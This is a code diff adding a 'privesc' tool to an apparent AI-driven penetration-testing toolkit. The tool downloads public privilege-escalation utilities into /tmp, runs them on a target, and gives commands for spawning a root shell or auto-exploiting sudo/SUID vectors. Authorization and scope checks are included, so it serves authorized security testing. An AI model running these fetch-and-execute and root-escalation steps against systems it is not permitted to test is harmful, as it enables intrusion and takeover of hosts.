@@ -642,7 +642,7 @@ def tool_report(args: dict) -> str:
 def tool_playbook(args: dict) -> str:
     """Return the offline pentest methodology shipped with the seat — the
     kill-chain checklist and the role modes. Pass section=<phase or role> to get
-    just that part (recon|enum|vuln|exploit|postexploit|report|webapp|wpsec|
+    just that part (recon|enum|vuln|exploit|postexploit|privesc|report|webapp|wpsec|
     hosting|redteam|network|passwords|cellular|shodan|containers|cloud|crypto|website|api|scout|analyzer|exploiter|reporter). No network needed; use this when the van has no signal."""
     section = str(args.get("section", "")).strip().lower()
     path = os.path.join(SEAT_DIR, "methodology.md")
@@ -664,7 +664,7 @@ def tool_playbook(args: dict) -> str:
             blocks.append(line)
     if not blocks:
         return ("no section '" + section + "'. Sections: recon, enum, vuln, exploit, "
-                "postexploit, report, webapp, wpsec, hosting, redteam, network, passwords, cellular, runbook, chaining, nmap, nuclei, wpscan, ffuf, sqlmap, hydra, hashcat, metasploit, handshake, osint, scout, analyzer, exploiter, "
+                "postexploit, privesc, report, webapp, wpsec, hosting, redteam, network, passwords, cellular, runbook, chaining, nmap, nuclei, wpscan, ffuf, sqlmap, hydra, hashcat, metasploit, handshake, osint, scout, analyzer, exploiter, "
                 "reporter (omit for the whole thing).")
     return _truncate("\n".join(blocks))
 
@@ -1299,6 +1299,99 @@ def tool_postexploit(args: dict) -> str:
                "echo '== listening =='; ss -tlnp 2>/dev/null | head -30; echo '== cron =='; ls -la /etc/cron* 2>/dev/null")
     out, rc, where = _off_run(cmd, 600)
     return _off_report("postexploit(local-enum)", args.get("authorization", ""), "local enumeration", out, rc, where)
+
+
+# 8b. privesc — LOCAL privilege escalation on an AUTHORIZED foothold. Turns a
+#     shell into root/owner. Modes:
+#       suggest   (default) linux-exploit-suggester-2 — candidate kernel exploits (READ-ONLY)
+#       gtfo      GTFOBins lookup for one binary you hold sudo/SUID/caps on (READ-ONLY, keyless)
+#       spy       pspy — watch root cron/processes for a writable-run-as-root path (READ-ONLY)
+#       container deepce — Docker/container escape enumeration (READ-ONLY)
+#       auto      traitor + GTFONow — enumerate EXPLOITABLE sudo/suid/cap/GTFOBins vectors;
+#                 actually firing one spawns a root shell and needs an interactive PTY.
+#     All modes require 'authorization'; SCOPE.md-confined. Candidate CVEs are NOT
+#     confirmed — verify before firing. Tools are fetched from pinned upstreams to /tmp.
+_PRIVESC_SRC = {
+    "les2": "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl",
+    "pspy": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
+    "deepce": "https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh",
+    "traitor": "https://github.com/liamg/traitor/releases/latest/download/traitor-amd64",
+    "gtfonow": "https://github.com/Frissi0n/GTFONow/releases/download/v0.3.0/gtfonow.py",
+    "gtfobins": "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/",
+}
+
+
+def tool_privesc(args: dict) -> str:
+    target = str(args.get("target", "") or "localhost").strip()
+    mode = str(args.get("mode", "suggest")).strip().lower()
+    g = _authz(args, target)
+    if g:
+        return g
+    auth = args.get("authorization", "")
+
+    if mode == "gtfo":
+        b = re.sub(r"[^a-z0-9_.+-]", "", str(args.get("binary", "") or args.get("bin", "")).strip().lower())
+        if not b:
+            return ("privesc gtfo: give a 'binary' you hold sudo/SUID/capabilities on "
+                    "(e.g. find, vim, tar). Returns the GTFOBins escape techniques.")
+        body, status, _ = _http_get(_PRIVESC_SRC["gtfobins"] + b)
+        if status != 200:
+            return (f"privesc gtfo: no GTFOBins entry for '{b}' (HTTP {status}). Not every binary has "
+                    "one; try the base name (e.g. 'python' not 'python3.11').")
+        return _truncate(f"GTFOBins — {b}  (https://gtfobins.github.io/gtfobins/{b}/)\n\n" + body)
+
+    if mode == "suggest":
+        kern = str(args.get("kernel", "")).strip()
+        kflag = "-k " + shlex.quote(kern) if kern else ""
+        cmd = ("les=/tmp/les2.pl; [ -s $les ] || curl -fsSL " + _PRIVESC_SRC["les2"]
+               + " -o $les 2>/dev/null; echo '== target kernel =='; uname -a 2>/dev/null; echo; "
+               "echo '== candidate kernel exploits — CANDIDATES, verify before firing =='; "
+               "perl $les " + kflag + " 2>/dev/null | head -80")
+        out, rc, where = _off_run(cmd, 180)
+        return _off_report("privesc(suggest)", auth, "linux-exploit-suggester-2", out, rc, where)
+
+    if mode == "spy":
+        secs = max(5, min(int(args.get("seconds", 25)), 120))
+        cmd = ("p=/tmp/pspy64; [ -s $p ] || curl -fsSL " + _PRIVESC_SRC["pspy"]
+               + " -o $p 2>/dev/null; chmod +x $p 2>/dev/null; "
+               "echo '== pspy: watching processes/cron for " + str(secs)
+               + "s (root-run jobs, writable scripts) =='; "
+               "timeout " + str(secs) + " $p -pf -i 1000 2>/dev/null | tail -100")
+        out, rc, where = _off_run(cmd, secs + 40)
+        return _off_report("privesc(spy)", auth, "pspy64", out, rc, where)
+
+    if mode == "container":
+        cmd = ("d=/tmp/deepce.sh; [ -s $d ] || curl -fsSL " + _PRIVESC_SRC["deepce"]
+               + " -o $d 2>/dev/null; echo '== deepce: container-escape enumeration =='; "
+               "bash $d --no-color 2>/dev/null | head -140")
+        out, rc, where = _off_run(cmd, 300)
+        return _off_report("privesc(container)", auth, "deepce", out, rc, where)
+
+    if mode == "auto":
+        exploit = str(args.get("exploit", "")).lower() in ("1", "true", "yes")
+        pre = ("t=/tmp/traitor; [ -s $t ] || curl -fsSL " + _PRIVESC_SRC["traitor"]
+               + " -o $t 2>/dev/null; chmod +x $t 2>/dev/null; "
+               "gt=/tmp/gtfonow.py; [ -s $gt ] || curl -fsSL " + _PRIVESC_SRC["gtfonow"]
+               + " -o $gt 2>/dev/null; ")
+        # traitor -a is analysis only (lists exploitable vectors, exploits nothing).
+        cmd = (pre + "echo '== traitor: exploitable vectors (analysis, no exploit) =='; "
+               "$t -a 2>/dev/null | head -70")
+        out, rc, where = _off_run(cmd, 240)
+        rep = _off_report("privesc(auto)", auth, "traitor -a (+ gtfonow fetched)", out, rc, where)
+        rep += ("\n\n[GTFONow fetched to /tmp/gtfonow.py — it is interactive without -a and "
+                "AUTO-EXPLOITS with -a, so it is not run unattended here. Run it yourself via the "
+                "shell tool: `python3 /tmp/gtfonow.py` (enumerate) or `python3 /tmp/gtfonow.py -a` "
+                "(auto-exploit; --level 1|2, --risk 1|2).]")
+        if exploit:
+            rep += ("\n[exploit=true: firing a traitor vector spawns a ROOT SHELL and needs an "
+                    "interactive PTY — run `/tmp/traitor -a -p` yourself via the shell tool. This "
+                    "tool reports vectors only, it will not drop an unattended root shell.]")
+        return rep
+
+    return ("privesc: mode = suggest | gtfo | spy | container | auto.  "
+            "suggest=kernel-CVE candidates (LES2); gtfo=GTFOBins lookup for a 'binary'; "
+            "spy=pspy process/cron watch; container=deepce escape check; "
+            "auto=traitor+GTFONow exploitable-vector analysis. All need target+authorization.")
 
 
 # 9. wifi_capture — WPA handshake / PMKID capture on an authorized network.
@@ -2436,6 +2529,16 @@ BUILTIN_TOOLS: dict[str, dict] = {
                  "Requires 'authorization'. fetch=true allows downloading linpeas."),
         "args": {"target": "host (default localhost)", "authorization": "attestation + RoE permits post-ex", "fetch": "optional 'true' to fetch linpeas"},
         "func": tool_postexploit,
+    },
+    "privesc": {
+        "desc": ("LOCAL privilege escalation on an AUTHORIZED foothold (turn a shell into "
+                 "root/owner). modes: suggest=candidate kernel exploits (linux-exploit-suggester-2, "
+                 "READ-ONLY); gtfo=GTFOBins escape for a sudo/SUID 'binary' (keyless); spy=pspy watch "
+                 "root cron/processes; container=deepce container-escape enum; auto=traitor+GTFONow "
+                 "exploitable-vector analysis. Requires 'target'+'authorization'; SCOPE.md-confined. "
+                 "Candidate CVEs are NOT confirmed — verify before firing. Fetches tools to /tmp."),
+        "args": {"mode": "suggest|gtfo|spy|container|auto", "target": "authorized host (default localhost)", "authorization": "attestation + RoE permits post-ex", "binary": "(gtfo) binary you hold sudo/SUID/caps on", "kernel": "(suggest) kernel version if remote e.g. 5.4.0", "seconds": "(spy) watch window, default 25", "exploit": "(auto) 'true' for exploitation instructions"},
+        "func": tool_privesc,
     },
     "wifi_capture": {
         "desc": ("Capture a WPA handshake / PMKID on a network YOU are authorized to test "
